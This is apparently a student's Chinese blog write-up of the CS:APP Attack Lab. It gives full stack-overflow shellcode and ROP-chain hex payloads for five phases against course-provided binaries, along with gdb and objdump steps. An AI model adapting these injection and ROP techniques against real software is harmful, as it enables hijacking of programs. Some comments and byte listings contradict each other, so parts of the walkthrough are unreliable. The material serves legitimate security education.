[TOC]

#### 前言

这个lab也是csapp第三章的lab，是最后缓冲区溢出内容对应的lab，总共有五个phase，代码注入攻击三个phase，ROP系统攻击两个phase，这个lab的主要目的就是让我们自己来完成代码注入攻击和ROP系统攻击。下面给出维基百科上关于代码注入和ROP系统攻击的解释，还有官网上的phase分数，不过这个分数不太可信。

<img src="http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221022163835223.png" alt="image-20221022163835223"  />

![image-20221022163622616](http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221022163622616.png)

<img src="http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221019214042998.png" alt="image-20221019214042998" style="zoom:80%;" />

首先从官网下载文件到自己的linux系统下，然后解压，可以看到几个文件。

* **ctarget**：用于进行代码注入攻击的可执行程序。
* **rtarget**：用于进行ROP系统攻击的可执行程序。
* **cookie.txt**: 一个16进制的代码，用于标识身份。
* **hex2raw**：用于生成攻击字符串的实用程序。
* **farm.c**：在ROP系统攻击中所用到的工具的源文件。在做实验的过程中，用不上。
* **README**：对目录中文件的描述

提供一个官方实验文档的链接[attacklab.pdf (cmu.edu)](http://csapp.cs.cmu.edu/3e/attacklab.pdf)，照着这个文档做实验就可以了,文档是一定要看的，不看文档没法做的。

ctarget和rtarget的读入程序都是来自标准输入的，通过getbuf函数来完成输入。下面是getbuf函数的源代码。

![image-20221022164211587](http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221022164211587.png)

函数中使用的Gets函数和标准库中的gets函数是相似的，都是从标准输入中读入(以'\n'或者EOF作为结束符)，储存在一个特定的位置。

可以看出特定位置就是buf数组，buf数组的大小为BUFFER_SIZE，BUFFER_SIZE是一个你的程序版本的编译时的常数。

ctarget和rtarget都是通过输入一个字符串来完成攻击，达到自己预期的结果，那么怎么来测试呢？

`./ctarget -q xxx.txt`就可以了，带-q就是不打评分，评分系统需要连接cmu的内网，我们只需要知道对错就可以了。后面的这个xxx.txt就是输入的字符串，但是这里的字符串需要通过hex2raw来生成，因为这里我们所看到的都是一些16进制数字，不方便自己构造字符串，所以就需要通过hex2raw来生成，所以一个完整的测试命令就是`./hex2raw < yyy.txt | ./ctarget`，这里的yyy.txt是自己构造的16进制序列。

**一些建议**

* 进行转换的16进制序列中最好不要出现0x0a，因为进行字符转换会将其转换为'\n'，从而结束字符串的输入。
* hex2raw期望由一个或多个空格分隔的两位十六进制值。如果例如你想将一个字节设为0，建议输入00。例如生成一个字符串0xdeadbeef ，你应该输入`ef be ad de`,因为是小端机器的原因。

---

#### Code Injection Attacks

为了实现代码注入攻击，在ctatget程序中，该程序以某种方式设置，从而使堆栈位置从一个运行到另一个运行中保持一致，因此可以将堆栈上的数据视为可执行的代码。就是不会进行栈随机化，栈的位置不会发生改变。这个特性容易使得程序遭受注入攻击，因为可以利用字符串包含可执行代码的字节编码。

##### level1

对于phase1，不需要注入代码，只需要重定向程序的执行过程。getbuf函数是由ctarget中的test函数调用的。

![image-20221022170928969](http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221022170928969.png)

当getbuf函数正常结束时，会正常返回到test函数，进行printf的调用。**我们的任务就是使getbuf函数执行后不返回到test函数，而去执行touch1函数**。

```c
void touch1()  
{
    vlevel = 1;  /*Part of validation protocol  */
 	printf("Touch1!: You called touch1()\n");  
    validate(1);  
    exit(0);
 }
```

**一些建议**

* 使用`objdump -d ctarget > ctarget.s`命令将ctarget代码进行反汇编，观察ctarget的反汇编代码。

* 思路是将`touch1`的开始地址，放在某个位置，以实现当`ret`指令被`getbuf`执行后会将控制权转移给`touch1`。
* 注意字节序。

<img src="http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221022171746118.png" alt="image-20221022171746118" style="zoom:67%;" />

先看看getbuf的汇编代码代码，首先开辟40个字节的栈帧空间，然后栈顶指针rsp作为第一个参数去调用Gets函数。所以读入的第一个字符就是放在栈顶。画一个函数的栈帧空间就可以发现我们只要将返回地址设置位touch1的起始地址就可以解决，可以在ctarget.s文件中看到touch1的首地址为0x00000000004017c0,所以可以构建输入的16进制序列。

```cpp
ans1.txt:
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00		// 将buf数组读满，getbuf函数开辟的字节数为40个字节	
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00		
c0 17 40 00 00 00 00 00	  // 返回地址设置为函数touch2的起始地址
```

最后getbuf函数结束调用，最后调用retq指令，跳转到touch1函数，去执行touch1函数。

可以测试执行`./hex2raw < ans1.txt | ./ctarget -q`看看对不对，结果为pass就是正确的。



<img src="http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221022172720853.png" alt="image-20221022172720853" style="zoom:67%;" />

![image-20221022173551091](http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221022173551091.png)



##### level2

level2需要注入一小段代码。看看touch2的源代码，我们的任务是让getbuf函数不返回到test函数，而去执行touch2函数。

```c
void touch2(unsigned val) 	// touch2函数有一个参数，并且只有当参数为cookie时，才是正确执行
{
    vlevel = 2;  
    if (val == cookie) 
    {  
        printf("Touch2!: You called touch2(0x%.8x)\n", val);  
        validate(2);  
    } 
    else
    {  
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

**一些建议**

* 你需要为你的注入代码产生一个字节表示，使得ret指令可以转移控制你的代码。
* 函数的第一个参数是通过rdi来传递的。
* 你的注入代码需要将寄存器设置为你的cookie，然后使用一个ret指令跳转到touch2。
* 不要再注入代码中使用`jmp`或者`call`指令，去看附录B如何使用工具生成指令序列的字节级表示。

```assembly
# 附录B中生成指令字节序列的例子：
#Example of hand-generated assembly code
pushq  $0xabcdef		# Push value onto stack
addq   $17,%rax			# Add 17 to %rax
movl   %eax,%edx 		# Copy lower 32 bits to %edx


# unix> gcc -c example.s		生成.o文件
# unix> objdump -d example.o > example.d	反汇编出.d文件
# cat example.d			查看.d文件

# example.o:  file format elf64-x86-64 				
# Disassembly of section .text: 
# 0000000000000000 <.text>:  		
# 0: 68 ef cd ab 00		pushq $0xabcdef				这里的68 ef ad ab ... c2就是这个代码的字节级表示
# 5: 48 83 c0 11		add  $0x11,%rax
# 9: 89 c2 				mov  %eax,%edx 
```

对于这个现在这个任务，需要写一个注入代码，然后获取到该注入代码的字节级表示。

```assembly
# ans2.s文件：
movq $0x59b997fa, %rdi  	#将cookie的值作为第一个参数
pushq 0x00000000004017ec	#将touch2的地址压入栈
retq					# 通过retq跳转到touch2

# ans2.d文件
ans2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq 
```

但是如何来执行这一段指令呢？可以先将其存在栈帧上，也就是buf数组里面，由于的栈的地址不会发生改变可以知道，下次程序开始指令存储的还是这个地址。所以可以以rsp指针指向的位置作为注入代码的起始地址。下次执行时栈的地址还是在这里，再次访问执行就可以了。设置返回地址为rsp指针。可以通过gdb查看rsp的地址。

![image-20221022215520876](http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221022215520876.png)

走到0x417ac的位置，此时栈帧空间已经开辟好了，先在0x4017ac这里打断点，然后run，再查看rsp寄存器的值就可以。

<img src="http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221021140525974.png" alt="image-20221021140525974" style="zoom:67%;" />

<img src="http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221022223812587.png" alt="image-20221022223812587" style="zoom:50%;" />

这是函数的栈帧的分配图。所以可以构建输入的16进制文件。

```
48 c7 c7 fa 97 b9 59 68		# 注入代码的字节序列
ec 17 40 00 c3 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 	#rsp地址

```

通过命令`./hex2raw < ans2.txt | ./ctarget -q`执行，结果为pass就是正确。

![image-20221021142122317](http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221021142122317.png)

##### level3

level3也是一个代码注入的任务，但是参数是一个字符指针。给出hexmath和touch3的源代码，和touch2类似，让cookie的地址作为touch3的参数，我们的任务就是让getbuf函数返回后去执行touch3，并且参数为cookie字符串的地址。

```c
/*Compare string to hex represention of unsigned value  */
int hexmath(unsigned val, char *sval)
{
    char cbuf[110];						// 注意开辟的空间大小
    /*Make position of check string unpredictable  */
    char* s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char* sval)
{
    vlevel = 3;			/*Part of validation protocol  */
    if(hexmath(cookie, sval))
    {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    }
    else
    {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

**一些建议**

* 您需要在利用字符串中包含cookie的字符串表示，由八个16进制的数字表示，并且不包含0x。
* 注意在c语言表示的字符串的末尾加一个''/0'。
* 你的注入代码需要将%rdi的值设为cookie字符串的地址。
* 当hexmath和touch3函数被调用时，他们的数据将会被压入栈中，覆盖掉getbuf的原有栈帧，所以你需要注意应该在哪里放置你的字符串。

**解决步骤**：

1. 首先将cookie的存在内存中，存在哪里呢？由touch3的函数可以发现，一定要存储在返回地址的上面，因为touch3中cbuf的地址开辟的太大，如果是在返回地址下面开辟，有可能会导致被覆盖。所以就可以设置在返回地址的上面。既然要存在内存中，所以需要翻译为16进制。0x59b997fa，查asscal码表可以发现，每个字符对应的16进制为`35 39 62 39 39 37 66 61`。
2. 类似于level2的操作。设置参数跳转到touch3.

```
ans3.s文件：
movq $0x5561dca8, %rdi			// 将cookie的地址(%rsp + 0x30)作为touch3的第一个参数
pushq $0x00000000004018fa		// touch3的地址压栈
retq							// 跳转到touch3

ans3.d文件:
ans3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 68 dc 61 55 	mov    $0x5561dca8,%rdi
   7:	68 fa 18 40 00       	pushq  $0x4018fa
   c:	c3                   	retq   
```

<img src="http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221022223723809.png" alt="image-20221022223723809" style="zoom: 50%;" />

这是函数的栈帧的分配图。所以可以构建输入的16进制文件。

```
48 c7 c7 a8 dc 61 55 68			#注入代码的字节序列
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 		# 返回地址为rsp的地址
35 39 62 39 39 37 66 61			# cookie字符串的16进制序列

```

![image-20221022224014030](http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221022224014030.png)

---

####  Return-Oriented Programming

在ratrget中进行代码注入攻击比在ctarget中更难，因为有两种手段来阻止这种攻击。

1. 它使用随机化，以使堆栈位置与另一个运行之间的不同之处。这使得无法确定您的注射代码将在何处。
2. 它将存放堆栈的内存段标记为不可执行，因此即使你可以将程序计数器设置为注入代码的开始，程序也会因为一个内存区段错误而失败。

就是首先不知道程序执行的起始地址，因为堆栈运行之间的地址不同的，并且标记堆栈中的可执行区域，就算把指令的字节序列放入堆栈，将PC指针指向该字节序列，也无法执行，那么怎么来完成攻击呢？

writeup文档中介绍了一种ROP攻击，大致的意思就是会利用现有的代码来完成攻击，可以利用现有的指令字节序列片段来制作小工具，来完成攻击。将这些小工具的指令字节的地址全部压到栈上通过ret指令依次执行需要执行的代码。由于不断地跳转到指定的位置去执行，所以并没有直接去执行栈上的代码，并且栈随机化也不会影响，因为没有需要用到绝对地址。

<img src="http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221023083200802.png" alt="image-20221023083200802" style="zoom:67%;" />

在程序中，提供了很多的指令字节序列来作为工具选用，

```c
//For example, one version of rtarget contains code generated for the following C function: 
void setval_210(unsigned *p)  
{
    *p = 3347663060U;  
}
 // 如果用源代码来攻击，好像不大可行，可以看看反汇编代码
0000000000400f15 <setval_210>:
400f15:		c7 07 d4 48 89 c7 	movl $78948d4, (%rdi)
400f1b:		c3					retq
```

上面的48 89 c7 是`movq %rax, %rdi`的编码指令(指令编码可以去writeup后面的附录文件查看)， 紧接着的c3是ret的指令编码，这个反汇编代码的起始地址为0x400f15，所以从地址0x40018开始执行就是去执行指令`movq %rax, %rdi和retq`。

在rtarget文件中包含了一堆像setval_210的函数，这些函数可以作为你的有利的工具去解决后面的问题。需要注意的是你的target的选用只可以在start_farm和end_farm中选用。

##### level4

level4的任务和level2一样就是让getbuf跳转到touch2，注意touch2有一个参数为cookie的值。

* movq：在Figure3A中，可以查看指令级的字节编码
* popq：在Figure3B中，可以查看指令级的字节编码
* ret：指令级的字节编码为c3。
* nop：这条指令的指令级字节编码只有0x90单个字节，它的唯一作用就是使得PC指针加1。

**一些建议**:

* 在这个level4中，所有你需要的工具都可以在start_farm和mid_farm中找到。
* 完成这次攻击只需要两个工具。
* 当使用一个pop指令作为工具时，他将会把数据从栈中弹出，所以你的输入字符串将包含数据和工具地址的集合。

**解决步骤**：

按照上面level2的代码注入做法，将ans2.s的文件中的汇编指令，找到对应的指令地址就可以。但是可以发现没有对应的mov立即数到寄存器的指令，所以需要曲线救国，能不能直接`popq %rdi`呢？将cookie放在栈顶的位置，直接pop就可以将数据放到%rdi中，不过也没有这样的指令，所以需要换个法子。

```assembly
popq %rax	#这两条指令都可以在start_farm和mid_farm中找到
retq
movq %rax, %rdi
retq
```



![image-20221022114434037](http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221022114434037.png)

这条对应着`popq %rax  retq`。

![image-20221022114516617](http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221022114516617.png)

这条对应着`movq %rax, %rdi nop retq`。

<img src="http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221023095954039.png" alt="image-20221023095954039" style="zoom:50%;" />

所以可以用这两条指令来完成攻击。上面是函数栈帧图，所以可以构建输入的16进制文件。

```
ans4.txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00			//把getbuf的缓冲区填满
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00			// popq指令的地址
fa 97 b9 59 00 00 00 00			// cookie
c5 19 40 00 00 00 00 00			// movq指令的地址
ec 17 40 00 00 00 00 00			// touch2的地址

```

![image-20221023091647534](http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221023091647534.png)

##### level5

level5的要求是和level3相同，跳转到touch3执行，且第一个参数为cookie的地址。需要完成这个攻击，需要从start_farm和end_farm中寻找对应的工具。

**一些建议**

* 你需要复习一下movl指令关于寄存器中高四个字节的处理。
* 这个官方的解答要求八个工具来完成，但并不是唯一的。

**解决步骤**：

1. 同样的依照level3来完成汇编指令的编写，再去寻找对应的工具来完成。这里的一个点需要注意的就是cookie的地址，由于栈随机化的原因，所以不能用绝对地址，需要用相对地址来完成，设置一个偏移量来完成查找,既然需要偏移量，那就需要add指令，然后去地址。或者直接一个leaq指令，在start_farm至end_farm中寻找，没有找到add指令，但是找到了一个lea指令，所以可以围绕着lea指令来做。

    ```assembly
    popq %rsi						# rsi也就是偏移量
    movq %rsp, %rdi					# rdi设置为rsp
    lea (%rdi, %rsi, 1), %rax		# 获取到cookie字符串的地址
    movq %rax, %rdi					# 作为第一个参数
    ```

    依次执行上面这些指令就可以完成了，但是有些指令编码在start_farm和end_farm中找不到。所以也要曲线救国。

    ```assembly
    popq %rax
    movl %eax, %edx				# popq %rsi
    movl %edx, %ecx
    movl %ecx, %esi
    
    movq %rsp, %rax				# movq %rsp, %di
    movq %rax, %rdi
    
    lea (%rdi, %rsi, 1), %rax	
    movq %rax, %rdi
    ```

    上面的这些指令都可以在start_farm和end_farm中找到。

![image-20221022151855563](http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221022151855563.png)

这条对应着`popq %rax`。

![image-20221022152605783](http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221022152605783.png)

这条对应着`movl %eax, %edx`。

![image-20221022151944854](http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221022151944854.png)

这条对应着`movl %edx, %ecx`。

![image-20221022152211616](http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221022152211616.png)

这条对应着`movl %ecx, %esi`。

![image-20221022152243150](http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221022152243150.png)

这条对应着`movq %rsp, %rax`。

![image-20221022152312843](http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221022152312843.png)

这条对应着`movq %rax, %rdi`

![image-20221022152348317](http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221022152348317.png)

这条对应着`lea (%rdi, %rsi, 1), %rax`。

![image-20221022152405944](http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221022152405944.png)

这条对应着`movq %rax, %rdi`。

<img src="http://shixiaozhong.oss-cn-hangzhou.aliyuncs.com/img/image-20221023095858489.png" alt="image-20221023095858489" style="zoom: 67%;" />

所以可以用这两条指令来完成攻击。上面是函数栈帧图，所以可以构建输入的16进制文件。

```cpp
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
    
ab 19 40 00 00 00 00 00					// popq %rax
20 00 00 00 00 00 00 00					// 偏移量为32个字节
dd 19 40 00 00 00 00 00 				// movl %eax, %edx
c5 19 40 00 00 00 00 00					// movl %rax, %rdi
70 1a 40 00 00 00 00 00					// movl %edx, %ecx
13 1a 40 00 00 00 00 00					// movl %ecx, %esi

06 1a 40 00 00 00 00 00					// movq %rsp, %rax
c5 19 40 00 00 00 00 00					// movq %rax, %rdi

d6 19 40 00 00 00 00 00					// lea(%rdi, %rsi, 1), %rax
c5 19 40 00 00 00 00 00					// movq %rax, %rdi

fa 18 40 00 00 00 00 00					// touch3
35 39 62 39 39 37 66 61 00				// cookie

```

---

#### 总结

这个lab做的时间不长，因为我不会做，都是跟着网上的教程走的。刚开始做的时候，真的啥也不会，英语也是个半吊子，借着翻译看writeup文件也就看得懂一点，就算看懂了思路，为什么要这么做也得想半天，个人感觉比bomblab难做多了，bomblab只要看汇编就可以了，汇编看懂了，就知道该怎么写了。虽然是看着教程做的，但是自己也思考了很多，也对函数栈帧的理解深刻了许多，做实验之前，自己就只是知道函数压栈，开辟栈帧空间啥的，函数调用有返回地址，但是具体的都不太清楚，现在做完这个实验，清晰了很多。
